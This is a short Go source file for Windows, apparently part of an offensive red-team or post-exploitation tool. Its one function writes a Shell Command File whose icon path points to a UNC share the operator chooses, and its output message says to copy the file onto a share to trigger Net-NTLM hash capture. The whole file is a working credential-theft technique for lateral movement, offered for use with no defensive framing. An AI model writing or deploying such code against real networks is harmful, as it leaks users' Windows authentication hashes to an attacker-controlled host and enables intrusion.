//go:build windows
// +build windows

package main

import (
	"fmt"
	"os"
	"path/filepath"
)

func lateralSCF(targetShare string) (string, error) {
	if targetShare == "" {
		return "", fmt.Errorf("target UNC path required, e.g. \\\\192.168.1.100\\share")
	}
	content := []byte("[ShellClassInfo]\nIconResource=\\\\" + targetShare + "\\test.ico,0\n")
	scfPath := filepath.Join(os.TempDir(), "forge_scf.scf")
	if err := os.WriteFile(scfPath, content, 0600); err != nil {
		return "", fmt.Errorf("write SCF: %v", err)
	}
	result := fmt.Sprintf("SCF file written to %s. Copy it to %s to trigger Net-NTLM hash capture.\nContent:\n%s", scfPath, targetShare, string(content))
	return result, nil
}
